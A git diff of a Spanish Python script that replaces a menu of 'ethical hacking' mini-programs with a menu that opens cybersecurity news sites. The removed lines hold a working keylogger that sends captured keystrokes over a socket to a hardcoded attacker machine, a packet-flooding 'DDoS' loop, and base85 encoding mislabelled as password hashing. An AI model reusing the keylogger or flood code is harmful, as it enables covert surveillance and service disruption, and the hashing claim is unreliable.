@@ -1,238 +1,405 @@
-import socket
-import keyboard
+#HERRAMIENTA DE AUTOMATIZACION DE BUSQUEDAS DE PAGINAS WEB
+#AUTOR DEL SCRIPT: ALEJANDRO DORAL
+
 import webbrowser
 import time
-import base64
-from colorama import Fore
-import inspect
+from colorama import Fore, init
 
-#Este programa consiste en ofrecer una eleccion al usuario
-#para que eliga entre 5 programas para hacking.
-#Cada programa esta dentro de una funcion
-#Primer programa: Un keylogger
-#Segundo programa: Un DDoS atack
-#Tercer programa: Noticias de ciberseguridad
-#Cuarto programa: Analisis de malware
-#Quinto programa: Hashear una contraseña
+# Inicializa colorama
+init(autoreset=True)
 
+time.sleep(2)
 print("")
+print(Fore.BLUE + "Noticias Ciberseguridad")
 
-#PRIMER PROGRAMA
-def keylogger():
-    try:
+time.sleep(2)
+print("")
+print("Elige la pagina web de noticias de ciberseguridad que te interese:")
+print("Elige un numero del 1 al 7, estas son las opciones:")
+
+print("1. The Hacker News")
+print("2. Krebs on Security")
+print("3. Dark Reading")
+print("4. SecurityWeek")
+print("5. Cyberscoop")
+print("6. WeLiveSecurity")
+print("7. ZDNet Security")
+
+time.sleep(2)
+print("\n")
+respuesta_usuario = input("--->")
+
+match int(respuesta_usuario):
+    case 1:
+        time.sleep(2)
+        print("\n")
+        print("Vale, pues vamos a abrir la pagina web de The Hacker News")
+        time.sleep(2)
+        webbrowser.open("https://thehackernews.com/")
+
+        time.sleep(2)
+        print("\n")
+        print("¿Ahora cual de las secciones quieres ver?")
+        print("Elige un numero del 1 al 4, estas son las opciones:")
+        time.sleep(2)
+        print("1. Ciberataques")
+        print("2. Vulnerabilidades")
+        print("3. Expertos en ciberseguridad")
+        print("4. Contactar con The Hacker News")
+        time.sleep(2)
         print("")
+        respuesta_usuario2 = input("--->")
+
+        match int(respuesta_usuario2):
+            case 1:
+                time.sleep(2)
+                print("Vale, pues vamos a abrir la pagina web de Ciberataques")
+                time.sleep(2)
+                webbrowser.open("https://thehackernews.com/search/label/Cyber%20Attack")
+            case 2:
+                time.sleep(2)
+                print("Vale, pues vamos a abrir la pagina web de Vulnerabilidades")
+                time.sleep(2)
+                webbrowser.open("https://thehackernews.com/search/label/Vulnerability")
+            case 3:
+                time.sleep(2)
+                print("Vale, pues vamos a abrir la pagina web de Expertos en ciberseguridad")
+                time.sleep(2)
+                webbrowser.open("https://thehackernews.com/expert-insights/")
+            case 4:
+                time.sleep(2)
+                print("Vale, pues vamos a abrir la pagina web de Contacto")
+                time.sleep(2)
+                webbrowser.open("https://thehackernews.com/contact-us/")
+            case _:
+                time.sleep(2)
+                print("Opción no válida, tienes que ingresar un número del 1 al 4")
+
+    case 2:
+        time.sleep(2)
+        print("Vale, pues vamos a abrir la página web de Krebs on Security")
+        time.sleep(2)
+        webbrowser.open("https://krebsonsecurity.com/")
+
+        print("¿Ahora cuál de las secciones quieres ver?")
+        print("Elige un número del 1 al 2, estas son las opciones:")
+        time.sleep(2)
+        print("1. Acerca del autor")
+        print("2. Advertising/Speaking")
+        time.sleep(2)
+        respuesta_usuario3 = input("--->")
+
+        match int(respuesta_usuario3):
+            case 1:
+                time.sleep(2)
+                print("Vale, pues vamos a abrir la página acerca del autor")
+                time.sleep(2)
+                webbrowser.open("https://krebsonsecurity.com/about/")
+            case 2:
+                time.sleep(2)
+                print("Vale, pues vamos a abrir la página de Advertising/Speaking")
+                time.sleep(2)
+                webbrowser.open("https://krebsonsecurity.com/cpm/")
+            case _:
+                time.sleep(2)
+                print("Opción no válida")
+
+    case 3:
+        time.sleep(2)
+        print("Vale, pues vamos a abrir la página web de Dark Reading")
+        time.sleep(2)
+        webbrowser.open("https://www.darkreading.com/")
+        time.sleep(2)
+        print("Parece que en esta ocasión no hay secciones que elegir")
+
+    case 4:
+        time.sleep(2)
+        print("Vale, pues vamos a abrir la página web de SecurityWeek")
+        time.sleep(2)
+        webbrowser.open("https://www.securityweek.com/")
+        time.sleep(2)
+        print("Elige un número del 1 al 5, estas son las opciones:")
+        time.sleep(2)
+        print("1. Malware")
+        print("2. Operaciones de seguridad")
+        print("3. Arquitecturas de ciberseguridad")
+        print("4. Estrategias de CISO")
+        print("5. Conferencias industriales de ciberseguridad")
+        time.sleep(2)
+        respuesta_usuario4 = input("--->")
+
+        match int(respuesta_usuario4):
+            case 1:
+                time.sleep(2)
+                print("Vale, pues vamos a abrir la página web de Malware")
+                time.sleep(2)
+                webbrowser.open("https://www.securityweek.com/category/malware-cyber-threats/")
+            case 2:
+                time.sleep(2)
+                print("Vale, pues vamos a abrir la página web de Operaciones de Seguridad")
+                time.sleep(2)
+                webbrowser.open("https://www.securityweek.com/category/threat-intelligence/")
+            case 3:
+                time.sleep(2)
+                print("Vale, pues vamos a abrir la página web de Arquitectura de Ciberseguridad")
+                time.sleep(2)
+                webbrowser.open("https://www.securityweek.com/category/security-architecture/")
+            case 4:
+                time.sleep(2)
+                print("Vale, pues vamos a abrir la página web de Estrategias de CISO")
+                time.sleep(2)
+                webbrowser.open("https://www.securityweek.com/category/ciso-strategy/")
+            case 5:
+                time.sleep(2)
+                print("Vale, pues vamos a abrir la página web de Conferencias Industriales")
+                time.sleep(2)
+                webbrowser.open("https://www.securityweek.com/category/industrial-security/")
+            case _:
+                time.sleep(2)
+                print("Opción no válida, tienes que ingresar un número")
+
+    case 5:
+        time.sleep(2)
         print("")
-        #Importamos librerias
+        print("Vale pues vamos a abrir la pagina web de CyberScoop")
+        time.sleep(2)
+        webbrowser.open("https://cyberscoop.com/")
 
-        #Para las conexiones
-        #import socket
-        #Para la entrada de teclado
-        #import keyboard
+        print("Esta pagina web tiene varias categorias")
+        print("")
+        print("Las categorias son estas:")
+        print("1.Aiscoop")
+        print("2.Fedscoop")
+        print("3.Defenscoop")
+        print("4.Cybescoop")
+        print("5.Statescoop")
+        print("6.Edscoop")
+        time.sleep(2)
+        print("")
+        print("Elige una")
+        respuesta_usuario5 = int(input("--->"))
 
-        #Almacenamos las palabras en una variable
-        palabra = ""
+        match respuesta_usuario5:
+            case 1:
+                time.sleep(2)
+                print("")
+                print("Vale pues vamos a abrir la pagina web de Aiscoop")
+                time.sleep(2)
+                webbrowser.open("https://aiscoop.com/")
 
-        #Contamos las palabras ingresadas
-        contador_palabras = 0
+            case 2:
+                time.sleep(2)
+                print("")
+                print("Vale pues vamos a abrir la pagina web de Fedscoop")
+                time.sleep(2)
+                webbrowser.open("https://fedscoop.com/")
 
-        #Bucle infinito para recibir las palabras
-        while True:
-            #Para empezar el evento de teclados
-            evento_de_teclado = keyboard.read_event()
-            #Si se pulsa una tecla
-            if evento_de_teclado.event_type==keyboard.KEY_DOWN:
-                #Si es la tecla espacio
-                if evento_de_teclado.name=="space":
-                    with open("keylogger_output.txt","a") as file:
-                        file.write(palabra + " ")
-                        print("Nueva palabra ingresada por la victima:")
-                        print(palabra)
-                        contador_palabras = contador_palabras + 1
-                        print("Numero de palabras ingresadas:")
-                        print(contador_palabras)
-                    palabra = ""  # Reiniciar palabra
-                #Si son el escape o un numero
-                #para salir del bucle y del programa
-                elif evento_de_teclado.name == "esc":
-                    print("El usuario ha pulsado el escape")
-                    break
-                elif evento_de_teclado.name.isnumeric():
-                    print("El usuario ha pulsado un numero")
-                    break
-                else:
-                    palabra += evento_de_teclado.name
+            case 3:
+                time.sleep(2)
+                print("")
+                print("Vale pues vamos a abrir la pagina web de Defensescoop")
+                time.sleep(2)
+                webbrowser.open("https://defensescoop.com/")
 
-        try:
-            #Con el archivo y una conexion socket
-            with open("keylogger_output.txt","rb") as file, socket.socket(socket.AF_INET,socket.SOCK_STREAM) as mi_socket:
-                mi_socket.connect(("10.0.2.15",443))
-                #Enviamos el fichero a nuestra maquina atacante
-                mi_socket.sendall(file.read())
-        except Exception as e:
-            #Para manejar si hay algun error
-            print("Error en el programa keylogger")
-            print(e)
+            case 4:
+                time.sleep(2)
+                print("")
+                print("Vale pues vamos a abrir la pagina web de Cybescoop")
+                time.sleep(2)
+                webbrowser.open("https://cyberscoop.com/")
+
+            case 5:
+                time.sleep(2)
+                print("")
+                print("Vale pues vamos a abrir la pagina web de Statescoop")
+                time.sleep(2)
+                webbrowser.open("https://statescoop.com/")
+
+            case 5:
+                time.sleep(2)
+                print("")
+                print("Vale pues vamos a abrir la pagina web de Edscoop")
+                time.sleep(2)
+                webbrowser.open("https://edscoop.com/")
+
+            case _:
+                time.sleep(2)
+                print("")
+                print("Opcion no valida")
+                print("Tienes que ingrear un numero")
+
+    case 6:
+        time.sleep(2)
+        print("")
+        print("Vale pues vamos a abrir la pagina web de WeLiveSecurity")
+        time.sleep(2)
+        webbrowser.open("https://www.welivesecurity.com/en/")
+
+        print("Esta pagina web tiene varias categorias")
+        print("Son estas:")
+        print("1.Tips y consejos")
+        welivesecuriti1 = "https://www.welivesecurity.com/en/tips-advice/"
+        print("Elige una de ellas")
+        respuesta_usuario6 = int(input("--->"))
+        print("2.Business")
+        welivesecuriti2 = "https://www.welivesecurity.com/en/business-security/"
+        print("3.Welivesience")
+        welivesecuriti3 = "https://www.welivesecurity.com/en/we-live-science/"
+        print("4.Scams")
+        welivesecuriti4 = "https://www.welivesecurity.com/en/scams/"
+        print("5.Privacidad")
+        welivesecuriti5 = "https://www.welivesecurity.com/en/privacy/"
+        print("6.Kids online")
+        welivesecuriti6="https://www.welivesecurity.com/en/kids-online/"
+        print("Elige una de ellas")
+        respuesta_usuario7 = int(input("--->"))
+
+        match respuesta_usuario7: 
+            case 1: #
+                time.sleep(2)
+                print("")
+                print("Vale pues vamos a abrir la pagina web de tips y consejos") #
+                time.sleep(2)
+                webbrowser.open(welivesecuriti1) #
+
+            case 2: #
+                time.sleep(2)
+                print("")
+                print("Vale pues vamos a abrir la pagina web de business") #
+                time.sleep(2)
+                webbrowser.open(welivesecuriti2) #
+
+            case 3: #
+                time.sleep(2)
+                print("")
+                print("Vale pues vamos a abrir la pagina web de WeLiveSience") #
+                time.sleep(2)
+                webbrowser.open(welivesecuriti3) #
+
+            case 4: #
+                time.sleep(2)
+                print("")
+                print("Vale pues vamos a abrir la pagina web estafas") #
+                time.sleep(2)
+                webbrowser.open(welivesecuriti4) #
+
+            case 5: #
+                time.sleep(2)
+                print("")
+                print("Vale pues vamos a abrir la pagina web de privacidad") #
+                time.sleep(2)
+                webbrowser.open(welivesecuriti5) #
+
+            case 6: #
+                time.sleep(2)
+                print("")
+                print("Vale pues vamos a abrir la pagina web de kids online") #
+                time.sleep(2)
+                webbrowser.open(welivesecuriti6) #
+
+            case _:
+                time.sleep(2)
+                print("")
+                print("Opcion no valida")
+                print("Tienes que elegir un numero")
+
+
+    case 7:
+        time.sleep(2)
+        print("")
+        print("Muy bien pues vamos a abrir la pagina web de ZDNet Security")
+        time.sleep(2)
+        webbrowser.open("https://www.zdnet.com/topic/security/")
+
+        print("Esta pagina web tiene varias categorias")
+        print("Son estas:")
+        print("1.Cyber Treats")
+        ZDNet1 = "https://www.zdnet.com/topic/cyber-threats/"
+        print("2.Password Manager")
+        ZDNet2 = "https://www.zdnet.com/topic/password-manager/"
+        print("3.Ransomware")
+        ZDNet3 = "https://www.zdnet.com/topic/ransomware/"
+        print("4.VPN")
+        ZDNet4 = "https://www.zdnet.com/topic/vpn/"
+        time.sleep(2)
+        print("")
+        print("Elige una de ellas")
+        respuesta_usuario8 = int(input("--->"))
+
+        match respuesta_usuario8:
+            case 1:
+                time.sleep(2)
+                print("")
+                print("Vale pues vamos a abrir la pagina web de Cyber Treats")
+                time.sleep(2)
+                webbrowser.open(ZDNet1)
+            case 2:
+                time.sleep(2)
+                print("")
+                print("Vale pues vamos a abrir la pagina web de Password Manager")
+                time.sleep(2)
+                webbrowser.open(ZDNet2)
+            case 3:
+                time.sleep(2)
+                print("")
+                print("Vale pues vamos a abrir la pagina web de Ransomware")
+                time.sleep(2)
+                webbrowser.open(ZDNet3)
+            case 4:
+                time.sleep(2)
+                print("")
+                print("Vale pues vamos a abrir la pagina web de VPN")
+                time.sleep(2)
+                webbrowser.open(ZDNet4)
+
+            case _:
+                time.sleep(2)
+                print("")
+                print("Esa no es una opcion valida")
+                print("Tienes que elegir un numero")
+            
+    case _:
+        time.sleep(2)
+        print("Opción no válida, tienes que ingresar un número válido")
+
+
+time.sleep(2)
+print("")
+print("Bueno... esas eran todas las paginas web")
+print("Quieres ingresar una URL? (SI/NO)")
+
+respuesta_usuario7 = (input("--->"))
+respuesta_usuario_url = respuesta_usuario7.lower()
+
+if respuesta_usuario_url == "si":
+    time.sleep(2)
+    print("")
+    print("Vale pues ingresa una URL")
+    url_usuario = input("--->")
     
-    except Exception as e:
-        print("Parece que el Keylogger no se ha podido ejecutar, deja que te muestre al menos su codigo: ")
-        print("")
-        codigo_keylogger = inspect.getsource(keylogger)
-        print(codigo_keylogger)
-        
-
-    #Cerramos la conexion
-    mi_socket.close()
-
-#SEGUNDO PROGRAMA
-def DDoS():
-    print("")
-    #Libreria de conexion
-    #import socket as SOCKET
-
-    #Servidor
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    #Parametros
-    ip = input("Dime la ip victima: ")
-    port = int(input("Dime el puerto: "))
-    bytess = 1000 * "x"
-
     try:
-        while True:
-            server.sendto(bytess.encode(), (ip, port))
-            print(f"Enviando paquetes a {ip}:{port}")
-    except KeyboardInterrupt:
-        print("Ataque detenido por el usuario.")
+        webbrowser.open(url_usuario)
     except Exception as e:
-        print("Error en el programa DDoS")
         print(e)
-    finally:
-        server.close()
+        print("Error en la busqueda de tu URL")
 
-#TERCER PROGRAMA
-def web_ciberseguridad():
-    #import webbrowser
-    #import time
-    #Los print
-    print("")
-    print("")
-    print("Vamos a ver las noticias de ciberseguridad")
-    print("")
-
-    #Url a la web
-    url = "https://thehackernews.com/"
-
-    for i in range(5, 0, -1):
-        print(f"Abriendo TheHackerNews.com en {i}...")
-        time.sleep(1)
-
-    print("")
-    print("GOOOO!!!")
-
-    #Abrimos la pagina web
-    webbrowser.open(url=url)
-
-
-#CUARTO PROGRAMA
-def Analisis_de_malware():
-    #import webbrowser
-    #import time
-    #Los print
-    print("")
-    print("")
-    print("Vamos a hacer un analisis de malware a esta maquina")
-    print("")
-
-    #Url a la web
-    url2 = "https://www.abuseipdb.com/"
-
-    for i in range(5, 0, -1):
-        print(f"Abriendo abuseipdb.com en {i}...")
-        time.sleep(1)
-
-    print("")
-    print("GOOOO!!!")
-
-    #Abrimos la pagina web
-    webbrowser.open(url=url2)
-
-#QUINTO PROGRAMA
-def hashear_contraseña():
-    #import base64
-
-    #Pedir contraseña al usuario
-    contraseña = input("Dime una contraseña para haseharla: ")
-    print("")
-
-    #Hashearla con un algoritmo
-    hashear_contraseña = base64.a85encode(contraseña.encode()).decode()
-
-    #Imprimirla
-    print("Tu contraseña hasheada es:")
-
-    print("")
-
-    print(hashear_contraseña)
-
-print("")
-print("")
-print("Programa hecho por Alejandro Doral")
-print("")
-time.sleep(2)
-print("Bienvenido a este programa con mini programas de hacking etico y ciberseguridad automatizados")
-print("")
-time.sleep(3)
-print("Estas son las opciones que tienes a elegir: ")
-print("")
-time.sleep(3)
-print(Fore.GREEN + "1. Programa Keylogger")
-print("")
-time.sleep(1.5)
-print(Fore.RED + "2. DDoS ataque")
-print("")
-time.sleep(1.5)
-print(Fore.BLUE + "3. Noticias de Ciberseguridad")
-print("")
-time.sleep(1.5)
-print(Fore.YELLOW + "4. Analisis de malware")
-print("")
-time.sleep(1.5)
-print(Fore.MAGENTA + "5. Hashear una contraseña")
-print(Fore.WHITE + "")
-time.sleep(3)
-print("Elige un programa")
-print("")
-eleccion_usuario = int(input("Programa a elegir --->"))
-time.sleep(2)
-print("")
-
-if eleccion_usuario == 1:
-    print(Fore.GREEN + "Has elegido el programa 1: Keylogger")
+elif respuesta_usuario_url == "no":
     time.sleep(2)
-    keylogger()
-elif eleccion_usuario == 2:
-    print(Fore.RED + "Has elegido el programa 2: Ataque DDoS")
-    time.sleep(2)
-    DDoS()
-elif eleccion_usuario == 3:
-    print(Fore.BLUE + "Has elegido el programa 3: Noticias de Ciberseguridad")
-    time.sleep(2)
-    web_ciberseguridad()
-elif eleccion_usuario == 4:
-    print(Fore.YELLOW + "Has elegido el programa 4: Analisis de malware")
-    time.sleep(2)
-    Analisis_de_malware()
-elif eleccion_usuario == 5:
-    print(Fore.MAGENTA + "Has elegido el programa 5: Hashear una contraseña")
     print("")
-    time.sleep(2)
-    hashear_contraseña()
+    print("Esta bien") 
+    print("Pues ya hemos acabado...")
+
 else:
-    print("Esa no es una opcion valida")
+    time.sleep(2)
+    print("")
+    print("Esa no es una respuesta valdia")
+    print("Tenias que escribir si o no")
 
+
+time.sleep(2)
 print("")
-print("")
-print("")
-print("Gracias por usar el programa de Doral")
+print("Gracias por usar mi programa!!!")
+print("Ha sido un placer ayudarte")
+print("Autor del script: Alejandro Doral")
 print("")
 print("")
